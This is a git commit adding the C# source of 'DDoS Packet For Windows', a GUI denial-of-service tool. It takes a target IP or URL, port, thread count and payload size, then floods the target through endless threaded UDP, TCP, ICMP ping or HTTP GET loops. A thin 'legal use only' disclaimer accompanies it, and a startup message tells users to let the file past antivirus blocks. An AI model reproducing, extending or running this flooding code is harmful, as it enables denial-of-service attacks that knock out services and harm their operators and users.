a0afc981d5697de346b32ce047889d3ff427525e
Fusedev <47820634+fusedevgithub@users.noreply.github.com>
2022-04-02 17:29:05 +0700

    Add files via upload

---
+++ DDoSPacket-For-Windows/DDoSPacket-For-Windows/Form1.Designer.cs
@@ -0,0 +1,251 @@
+﻿namespace DDoSPacket_For_Windows
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.label3 = new System.Windows.Forms.Label();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label4 = new System.Windows.Forms.Label();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label5 = new System.Windows.Forms.Label();
+            this.comboBox1 = new System.Windows.Forms.ComboBox();
+            this.label6 = new System.Windows.Forms.Label();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.label7 = new System.Windows.Forms.Label();
+            this.label8 = new System.Windows.Forms.Label();
+            this.label9 = new System.Windows.Forms.Label();
+            this.textBox4 = new System.Windows.Forms.TextBox();
+            this.button2 = new System.Windows.Forms.Button();
+            this.SuspendLayout();
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(97, 9);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(271, 25);
+            this.label1.TabIndex = 0;
+            this.label1.Text = "DDoS Packet For Windows";
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(12, 319);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(440, 13);
+            this.label2.TabIndex = 1;
+            this.label2.Text = "We are not responsible for any damage caused by this application please legally t" +
+    "o use only!";
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.Location = new System.Drawing.Point(53, 50);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(65, 20);
+            this.label3.TabIndex = 2;
+            this.label3.Text = "URL/IP:";
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(116, 50);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(152, 20);
+            this.textBox1.TabIndex = 3;
+            // 
+            // label4
+            // 
+            this.label4.AutoSize = true;
+            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label4.Location = new System.Drawing.Point(53, 76);
+            this.label4.Name = "label4";
+            this.label4.Size = new System.Drawing.Size(42, 20);
+            this.label4.TabIndex = 4;
+            this.label4.Text = "Port:";
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(101, 76);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(152, 20);
+            this.textBox2.TabIndex = 5;
+            // 
+            // label5
+            // 
+            this.label5.AutoSize = true;
+            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label5.Location = new System.Drawing.Point(53, 99);
+            this.label5.Name = "label5";
+            this.label5.Size = new System.Drawing.Size(75, 20);
+            this.label5.TabIndex = 6;
+            this.label5.Text = "Methods:";
+            // 
+            // comboBox1
+            // 
+            this.comboBox1.FormattingEnabled = true;
+            this.comboBox1.Items.AddRange(new object[] {
+            "UDP",
+            "TCP",
+            "ICMP",
+            "HTTP/GET (under dev)"});
+            this.comboBox1.Location = new System.Drawing.Point(132, 98);
+            this.comboBox1.Name = "comboBox1";
+            this.comboBox1.Size = new System.Drawing.Size(121, 21);
+            this.comboBox1.TabIndex = 7;
+            // 
+            // label6
+            // 
+            this.label6.AutoSize = true;
+            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label6.Location = new System.Drawing.Point(53, 122);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(63, 20);
+            this.label6.TabIndex = 8;
+            this.label6.Text = "Thread:";
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(128, 125);
+            this.textBox3.Name = "textBox3";
+            this.textBox3.Size = new System.Drawing.Size(125, 20);
+            this.textBox3.TabIndex = 9;
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(193, 265);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 10;
+            this.button1.Text = "Start";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // label7
+            // 
+            this.label7.AutoSize = true;
+            this.label7.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label7.Location = new System.Drawing.Point(53, 168);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(265, 24);
+            this.label7.TabIndex = 11;
+            this.label7.Text = "Packet sending are success: 0";
+            // 
+            // label8
+            // 
+            this.label8.AutoSize = true;
+            this.label8.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label8.Location = new System.Drawing.Point(53, 192);
+            this.label8.Name = "label8";
+            this.label8.Size = new System.Drawing.Size(287, 24);
+            this.label8.TabIndex = 12;
+            this.label8.Text = "Packet sending are unsuccess: 0";
+            // 
+            // label9
+            // 
+            this.label9.AutoSize = true;
+            this.label9.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label9.Location = new System.Drawing.Point(55, 148);
+            this.label9.Name = "label9";
+            this.label9.Size = new System.Drawing.Size(137, 20);
+            this.label9.TabIndex = 13;
+            this.label9.Text = "Size MB (Max 50):";
+            // 
+            // textBox4
+            // 
+            this.textBox4.Location = new System.Drawing.Point(193, 150);
+            this.textBox4.Name = "textBox4";
+            this.textBox4.Size = new System.Drawing.Size(125, 20);
+            this.textBox4.TabIndex = 14;
+            // 
+            // button2
+            // 
+            this.button2.Location = new System.Drawing.Point(193, 293);
+            this.button2.Name = "button2";
+            this.button2.Size = new System.Drawing.Size(75, 23);
+            this.button2.TabIndex = 15;
+            this.button2.Text = "Stop";
+            this.button2.UseVisualStyleBackColor = true;
+            this.button2.Click += new System.EventHandler(this.button2_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(471, 341);
+            this.Controls.Add(this.button2);
+            this.Controls.Add(this.textBox4);
+            this.Controls.Add(this.label9);
+            this.Controls.Add(this.label8);
+            this.Controls.Add(this.label7);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.label6);
+            this.Controls.Add(this.comboBox1);
+            this.Controls.Add(this.label5);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.label4);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "DDoSPacket";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label4;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.ComboBox comboBox1;
+        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.TextBox textBox3;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Label label7;
+        private System.Windows.Forms.Label label8;
+        private System.Windows.Forms.Label label9;
+        private System.Windows.Forms.TextBox textBox4;
+        private System.Windows.Forms.Button button2;
+    }
+}
+
---
+++ DDoSPacket-For-Windows/DDoSPacket-For-Windows/Form1.cs
@@ -0,0 +1,236 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Drawing;
+using System.Linq;
+using System.Net;
+using System.Net.NetworkInformation;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Timer = System.Windows.Forms.Timer;
+
+namespace DDoSPacket_For_Windows
+{
+    public partial class Form1 : Form
+    {
+        public int amount = 0;
+        public int amountf = 0;
+
+        public Form1()
+        {
+            InitializeComponent();
+            Timer tmr = new Timer();
+            tmr.Interval = 50;   // milliseconds
+            tmr.Tick += update;  // set handler
+            tmr.Start();
+        }
+        private void update(object sender, EventArgs e)  //run this logic each timer tick
+        {
+            this.label7.Text = "Packet sending are success: " + amount;
+            this.label8.Text = "Packet sending are unsuccess: " + amountf;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            MessageBox.Show("Welcome to DDoS Packet for Windows\nWarning: We are not responsible for any damage caused by this program please legally to use only!\nNotice:\n- This program maybe not working on windows 7\n- Most of Anti-Virus will blocked this file please allowed this file that safe. \n-ICMP Methods will send 1MB  you can't edit it\nVersion: 1.0", "Welcome", MessageBoxButtons.OK, MessageBoxIcon.Information);
+
+        }
+        private void button1_Click(object sender, EventArgs e)
+        {
+            if (textBox1.Text == "")
+            {
+                MessageBox.Show("Error IP Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            if (textBox2.Text == "")
+            {
+                MessageBox.Show("Error Port Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            if (textBox3.Text == "")
+            {
+                MessageBox.Show("Error Thread box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            if (textBox4.Text == "")
+            {
+                MessageBox.Show("Error Size Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+            if (comboBox1.Text == "")
+            {
+                MessageBox.Show("Error Methods Box can't null", "Attack Status", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            if (comboBox1.Text == "UDP")
+            {
+                new Thread(() =>
+                {
+                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
+                    {
+                        udpattack();
+                    }
+                }).Start();
+            }
+               else if (comboBox1.Text == "TCP")
+            {
+                new Thread(() =>
+                {
+                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
+                    {
+                        tcpattack();
+                    }
+                }).Start();
+            }
+            else if (comboBox1.Text == "ICMP")
+            {
+                new Thread(() =>
+                {
+                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
+                    {
+                        icmpattack();
+                    }
+                }).Start();
+            }
+            else if (comboBox1.Text == "HTTP/GET (under dev)")
+            {
+                new Thread(() =>
+                {
+                    for (int i = 0; i < int.Parse(textBox3.Text); i++)
+                    {
+                        HTTPGETATTACK();
+                    }
+                }).Start();
+            }
+        }
+        public static String generateStringSize(long sizeByte)
+        {
+
+            StringBuilder sb = new StringBuilder();
+            Random rd = new Random();
+
+            var numOfChars = sizeByte;
+            string allows = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            int maxIndex = allows.Length - 1;
+            for (int i = 0; i < numOfChars; i++)
+            {
+                int index = rd.Next(maxIndex);
+                char c = allows[index];
+                sb.Append(c);
+            }
+            return sb.ToString();
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            System.Diagnostics.Process.GetCurrentProcess().Kill();
+        }
+        public void udpattack()
+        {
+            
+            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram,
+                ProtocolType.Udp);
+
+            IPAddress serverAddr = IPAddress.Parse(textBox1.Text);
+
+            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(textBox2.Text));
+            string data = generateStringSize(1024 * int.Parse(textBox4.Text));
+            byte[] sus = Encoding.ASCII.GetBytes(data);
+            sock.Connect(serverAddr, int.Parse(textBox2.Text));
+                for (; ; )
+                {
+                new Thread(() =>
+                {
+                    try
+                    {
+                        sock.SendTo(sus, endPoint);
+                        amount++;
+                    }
+                    catch
+                    {
+                        amountf++;
+                    }
+                }).Start();                    
+                }
+        }
+        public void tcpattack()
+        {
+            Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            IPAddress serverAddr = IPAddress.Parse(textBox1.Text);
+
+            IPEndPoint endPoint = new IPEndPoint(serverAddr, int.Parse(textBox2.Text));
+            string data = generateStringSize(1024 * int.Parse(textBox4.Text));
+            byte[] sus = Encoding.ASCII.GetBytes(data);
+            sock.Connect(serverAddr, int.Parse(textBox2.Text));
+            for (; ; )
+            {
+                new Thread(() =>
+                {
+                    try
+                    {
+                        sock.SendTo(sus, endPoint);
+                        amount++;
+                    }
+                    catch
+                    {
+                        amountf++;
+                    }
+                }).Start();
+            }
+        }
+        public void icmpattack()
+        {
+            new Thread(() =>
+            {
+                Ping pingSender = new Ping();
+                string data = generateStringSize(1024 * 1);
+                byte[] sus = Encoding.ASCII.GetBytes(data);
+                int timeout = 5000;
+                PingOptions options = new PingOptions(64, true);
+                for (; ; )
+                {
+                    new Thread(() =>
+                    {
+                        try
+                        {
+                            PingReply reply = pingSender.Send(textBox1.Text, timeout, sus, options);
+                            amount++;
+                        }
+                        catch
+                        {
+                            amountf++;
+                        }
+                    }).Start();
+                }
+            }).Start();
+            }
+        public void HTTPGETATTACK()
+        {
+            var url = textBox1.Text;
+            
+            for (; ; )
+            {
+                new Thread(() =>
+                {
+                    WebRequest request = WebRequest.Create(textBox1.Text);
+                    request.Method = "GET";
+                    try
+                    {
+                        WebResponse response = request.GetResponse();
+                        amount++;
+                    }
+                    catch
+                    {
+                        amountf++;
+                    }
+                }).Start();
+            }
+        }
+        }
+    }
